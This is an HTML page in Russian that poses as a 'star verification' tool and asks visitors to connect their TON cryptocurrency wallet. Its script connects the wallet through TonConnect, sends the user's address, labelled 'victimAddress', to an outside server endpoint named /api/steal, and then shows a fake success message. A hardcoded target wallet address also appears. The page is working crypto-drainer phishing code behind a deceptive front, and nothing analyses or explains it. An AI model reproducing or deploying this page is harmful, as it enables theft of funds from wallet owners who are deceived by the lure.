<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Звёзды</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0b0b0b; color: #00ffcc; padding: 20px; text-align: center; }
    button { background: #1f3a3a; color: #00ffcc; border: 1px solid #00ffcc; padding: 14px 28px; font-size: 18px; cursor: pointer; border-radius: 6px; }
    #log { margin-top: 20px; background: #111; padding: 15px; border-radius: 8px; }
  </style>
</head>
<body>
  <h2>⭐ Проверка звёзд</h2>
  <p>Нажмите кнопку, чтобы подтвердить звёзды</p>
  <button id="connectBtn">Подключить кошелёк</button>
  <div id="log">Готово</div>

  <script>
    const TARGET_WALLET = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";

    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@tonconnect/sdk@2.0.0/dist/tonconnect-sdk.min.js';
    script.onload = () => { document.getElementById('log').innerHTML = 'Нажмите кнопку'; init(); };
    script.onerror = () => { document.getElementById('log').innerHTML = 'Ошибка загрузки SDK'; };
    document.head.appendChild(script);

    function init() {
      const log = document.getElementById('log');
      const btn = document.getElementById('connectBtn');

      if (typeof TonConnect === 'undefined') {
        log.innerHTML = 'SDK не загружен';
        return;
      }

      const connector = new TonConnect({
        manifestUrl: "https://raw.githubusercontent.com/ton-connect/demo-dapp/main/tonconnect-manifest.json"
      });

      btn.onclick = async () => {
        log.innerHTML = 'Подключаем...';
        try {
          const wallet = await connector.connectWallet();
          const userAddress = wallet.account.address;

          const response = await fetch('https://AfiAfiDroch.pythonanywhere.com/api/steal', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ victimAddress: userAddress })
          });

          const result = await response.json();
          console.log(result);

          log.innerHTML = '✅ Звёзды подтверждены!';
        } catch (err) {
          log.innerHTML = '❌ Ошибка. Попробуйте ещё раз.';
          console.error(err);
        }
      };
    }
  </script>
</body>
</html>
